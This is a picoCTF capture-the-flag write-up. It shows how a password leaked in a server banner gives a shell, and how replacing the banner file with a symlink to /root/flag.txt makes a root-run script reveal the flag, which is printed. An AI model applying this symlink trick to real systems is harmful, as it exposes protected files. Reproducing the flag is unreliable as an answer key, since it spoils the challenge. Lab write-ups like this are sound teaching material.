## ðŸ”Ž Solution
The first server contains leaked information. Upon connecting, we discover the password: `My_Passw@rd_@1234`.
```bash
> nc tethys.picoctf.net 53058
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Next, we connect to the second server. 
Here, we are prompted with a series of questions. 
Answering them correctly grants us shell access, allowing us to execute commands.
```bash
what is the password? 
My_Passw@rd_@1234

```

Running `ls` in the home directory `~`, we find 2 files: `banner` and `text`. 
Upon inspection, neither file appears to contain the flag.
```bash
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
```  

Navigating to the `/root` directory, we discover 2 files: `flag.txt` and `script.py`. 
However, we don't have the necessary permissions to read `flag.txt`.
```bash
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt    
cat flag.txt
cat: flag.txt: Permission denied
```

Examining `script.py`, we learn that it is responsible for displaying the server's welcome message upon user connection. 
Specifically, it reads and prints the contents of `/home/player/banner`, which we've already seen.
```python
 try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")
```

Since we cannot read `flag.txt` directly due to permission restrictions, we consider using a **[symbolic link](https://www.geeksforgeeks.org/how-to-symlink-a-file-in-linux/)** (*symlink*). 
A symlink is a special type of file that acts as a reference or shortcut to another file or directory.  
To exploit this, we delete the original banner file and create a symlink that points to `/root/flag.txt`:
```bash
player@challenge:~$ rm -rf banner
rm -rf banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls
ls
banner  text
```
This command creates a symbolic link named banner that redirects to the restricted `flag.txt`.  
Now, when a user connects to the server again, `script.py` reads the new banner - which is actually a symlink to `flag.txt`. 
As a result, the contents of the flag are displayed on connection, successfully revealing the flag.
```bash
> nc tethys.picoctf.net 55013
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
```
